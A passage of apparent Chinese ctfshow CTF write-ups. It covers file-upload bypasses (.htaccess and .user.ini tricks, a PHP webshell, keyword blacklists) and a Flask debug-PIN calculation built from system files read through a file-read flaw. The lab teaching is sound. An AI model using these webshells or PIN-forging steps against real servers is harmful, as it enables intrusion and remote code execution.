class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只允许上传jpg格式图片&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h1><h2 id="上传zip文件"><a href="#上传zip文件" class="headerlink" title="上传zip文件"></a>上传zip文件</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190013197.png" alt="image-20220409190013197"></p><p>新建一个zip文件写入一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190250489.png" alt="image-20220409190250489"></p><p>直接上传</p><p>下载的时候抓包</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190330204.png" alt="image-20220409190330204"></p><p>访问</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409190348075.png" alt="image-20220409190348075"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-28 22:14:40</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;application/x-zip-compressed&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;zip&quot;</span>)))&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;./upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]).<span class="string">&#x27;.zip&#x27;</span>);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]).<span class="string">&#x27;.zip&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只允许上传zip格式文件&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure><h1 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h1><h2 id="haccess绕过"><a href="#haccess绕过" class="headerlink" title=".haccess绕过"></a>.haccess绕过</h2><p><a href="https://www.cnblogs.com/milantgh/p/5116955.html">apache解析漏洞</a></p><p>先上传.htaccess文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .png   //将.png后缀的文件解析 成php</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>先改名为.jpg哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191234392.png" alt="image-20220409191234392"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191314806.png" alt="image-20220409191314806"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409191342770.png" alt="image-20220409191342770"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-28 22:14:40</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>)))&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;只允许上传jpg格式文件&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h1><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个还行</p><p>直接传php哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409203031866.png" alt="image-20220409203031866"></p><p>访问</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409204412138.png" alt="image-20220409204412138"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409204452770.png" alt="image-20220409204452770"></p><h1 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h1><h2 id="user-ini日志包含"><a href="#user-ini日志包含" class="headerlink" title=".user.ini日志包含"></a>.user.ini日志包含</h2><p>上传zip哦,在该content</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_append_file=&quot;/var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure><p>上传一个user.ini ua加一句话</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409210821709.png" alt="image-20220409210821709"></p><p>接着上传一个1.php文件,内容随便</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409210852788.png" alt="image-20220409210852788"></p><p>连接1.php文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-30 00:11:17</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$str</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$str</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/eval|include|require|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\&lt;|\&gt;/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211240811.png" alt="image-20220409211240811"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211338918.png" alt="image-20220409211338918"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409211444701.png" alt="image-20220409211444701"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-30 00:11:17</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$str</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$str</span>)===<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&#x27;./upload/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/eval|assert|assert|_POST|_GET|_COOKIE|system|shell_exec|php|\\$|\?|\&lt;|\&gt;|\(|\)|\&#123;|\[|\&#125;|\]|\,|\%|\`|\~|\+/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用姿势</title>
      <link href="/ctfshow/ctf.show/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
      <url>/ctfshow/ctf.show/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<h1 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414193004005.png" alt="image-20220414193004005"></p><p>可以读文件,查看本地进程</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/cmdline</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414193116871.png" alt="image-20220414193116871"></p><p>可见是个py程序</p><p>python后台地址&#x2F;app&#x2F;app.py</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144504561.png" alt="image-20220417144504561"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/usr/local/lib/python3.<span class="number">8</span>/site-packages/flask/app.py</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144543865.png" alt="image-20220417144543865"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/sys/<span class="class"><span class="keyword">class</span>/<span class="title">net</span>/<span class="title">eth0</span>/<span class="title">address</span></span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144605982.png" alt="image-20220417144605982"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/sys/kernel/random/boot_id</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144634650.png" alt="image-20220417144634650"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/cgroup</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220417144708334.png" alt="image-20220417144708334"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import getpass</span><br><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> itertools import chain</span><br><span class="line">import sys</span><br><span class="line">import uuid</span><br><span class="line">import typing <span class="keyword">as</span> t</span><br><span class="line">username=<span class="string">&#x27;root&#x27;</span> <span class="comment">#/etc/passwd</span></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">modname= <span class="title function_ invoke__">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.<span class="title function_ invoke__">cast</span>(<span class="keyword">object</span>, app).__class__.__module__)</span><br><span class="line">mod=sys.modules.<span class="title function_ invoke__">get</span>(modname)</span><br><span class="line">mod = <span class="title function_ invoke__">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, None)</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    username, <span class="comment">#用户名</span></span><br><span class="line">    modname,  <span class="comment">#一般固定为flask.app</span></span><br><span class="line">    <span class="title function_ invoke__">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, app.__class__.__name__), <span class="comment">#固定，一般为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>,   <span class="comment">#主程序（app.py）运行的绝对路径</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">print</span>(probably_public_bits)</span><br><span class="line">mac =<span class="string">&#x27;02:42:ac:0c:e4:fe&#x27;</span>.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="comment">#/sys/class/net/eth0/address</span></span><br><span class="line">mac=<span class="title function_ invoke__">str</span>(<span class="keyword">int</span>(mac,base=<span class="number">16</span>))</span><br><span class="line">private_bits = [</span><br><span class="line">   mac,<span class="comment">#mac地址十进制</span></span><br><span class="line"> <span class="string">&quot;653dc458-4634-42b1-9a7a-b22a082e1fcecb3154994b94a4a667e472248cb1a254df7e0b46987a3056cca25a996dde7c97&quot;</span> <span class="comment">#/proc/sys/kernel/random/boot_id /proc/self/cgroup</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">print</span>(private_bits)</span><br><span class="line">h = hashlib.<span class="title function_ invoke__">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit in <span class="title function_ invoke__">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_ invoke__">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_ invoke__">encode</span>(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.<span class="title function_ invoke__">update</span>(bit)</span><br><span class="line">h.<span class="title function_ invoke__">update</span>(b<span class="string">&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = f<span class="string">&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">h.<span class="title function_ invoke__">update</span>(b<span class="string">&quot;pinsalt&quot;</span>)</span><br><span class="line">num = f<span class="string">&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv=None</span><br><span class="line"><span class="keyword">if</span> rv is None:</span><br><span class="line">    <span class="keyword">for</span> group_size in <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                num[x : x + group_size].<span class="title function_ invoke__">rjust</span>(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x in <span class="title function_ 